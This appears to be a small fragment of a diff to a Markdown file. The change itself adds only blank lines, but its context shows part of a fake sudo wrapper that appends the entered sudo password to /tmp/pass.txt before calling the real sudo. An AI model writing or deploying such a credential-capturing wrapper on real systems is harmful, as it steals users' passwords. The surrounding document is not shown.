@@ -20,3 +20,5 @@ echo $sudopass >> /tmp/pass.txt
 
 /usr/bin/sudo $@
 ```
+
+
